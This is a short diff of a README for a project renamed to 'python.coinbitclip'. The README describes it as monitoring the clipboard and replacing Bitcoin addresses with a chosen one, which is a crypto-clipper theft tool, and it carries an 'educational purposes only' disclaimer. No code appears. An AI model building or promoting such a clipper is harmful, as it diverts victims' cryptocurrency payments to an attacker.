@@ -1,4 +1,4 @@
-# PYcoinbitclip
+# python.coinbitclip
 Clipboard monitoring and automatic replacement of BTC addresses with the desired one.
 
 ### DISCLAIMER
@@ -17,7 +17,7 @@ TO BE USED FOR EDUCATIONAL PURPOSES ONLY
    
 2. Open the created folder:
    ```bash
-   cd PYcoinbitclip
+   cd python.coinbitclip
    ```
 
 3. Install third-party dependencies:
